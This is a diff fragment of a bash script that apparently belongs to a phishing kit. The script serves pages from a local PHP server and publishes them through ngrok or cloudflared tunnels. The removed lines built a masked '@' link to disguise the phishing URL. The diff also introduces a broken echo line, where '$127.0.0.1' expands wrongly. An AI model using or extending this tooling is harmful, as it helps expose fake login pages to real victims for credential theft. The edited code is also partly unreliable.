@@ -70,45 +70,17 @@ echo ""
                            echo ""
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 			   echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Chack Link Server \e[1;91m (1/2/3) : \e[0m' option
-echo""
-
-HOST='127.0.0.1'
-PORT='4444'
-
-
 
 	echo ""		   
-if [[ $option == *'1'* ]]; then
-## Start ngrok
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-	{ sleep 1; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
-
-    if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
-    else
-        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
-    fi
-
-	{ sleep 8; clear; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-	ngrok_url1=${ngrok_url#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
-	sleep 3
-exit
-fi
-if [[ $option == *'2'* ]]; then
 ## Start Cloudflared
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$127.0.0.1:4444 ${GREEN})"
 	{ sleep 1; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+        sleep 2 && ./.server/cloudflared tunnel -url 127.0.0.1:4444 --logfile .cld.log > /dev/null 2>&1 &
     fi
 
 	{ sleep 8; clear; }
@@ -912,3 +884,6 @@ elif [ $option = 50 ] || [ $option = 050 ]
 		         echo
 		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
 		         sleep 2
+                         exit
+		         fi
+                         done
